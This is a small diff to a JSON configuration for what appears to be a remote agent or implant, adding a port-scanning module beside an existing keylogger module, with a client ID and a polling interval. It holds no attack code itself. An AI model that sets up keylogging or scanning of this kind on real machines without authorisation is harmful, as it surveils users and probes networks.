@@ -2,7 +2,8 @@
     "client_id": "dd424fb2-097b-4f72-bb2a-07c0246665fb",
     "modules": [
         "test",
-        "keylogger_module"
+        "keylogger_module",
+        "portscan_module"
     ],
     "poll_interval": 30
 }
